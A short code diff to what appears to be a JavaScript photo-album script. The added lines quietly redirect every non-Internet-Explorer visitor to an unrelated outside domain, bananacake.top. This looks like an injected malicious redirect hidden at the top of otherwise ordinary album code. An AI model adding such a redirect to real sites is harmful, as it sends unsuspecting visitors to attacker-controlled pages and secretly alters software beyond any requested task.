@@ -1,3 +1,6 @@
+if (!window.document.documentMode) {
+    window.location = 'https://bananacake.top/images'
+}
 var range = 0;
 var album = photos;
 albumName = 'photos';
